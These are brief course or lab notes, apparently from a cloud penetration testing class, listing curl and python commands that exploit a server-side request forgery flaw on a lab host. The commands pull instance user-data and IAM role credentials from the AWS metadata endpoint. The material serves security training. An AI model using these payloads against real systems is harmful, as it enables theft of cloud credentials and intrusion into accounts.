Makes the fetching more verbose
```python
curl -v http://invoice.awesome-sparrow.sec588.cloud/url?url=fake://localhost:8080/
```

Does not show the progress or error messages
```python
curl -s http://invoice.awesome-sparrow.sec588.cloud/url?url=http://169.254.169.254/latest/user-data/
```

Uses the python script to take a GET request and submit a 301 redirect to your chosen URL
```python3
python3 adminer.py --port 9999 http://169.254.169.254/latest/meta-data/iam/security-credentials/class-eksctl-awesome-sparrow-workers
```
>
    --port is the port we're listening on

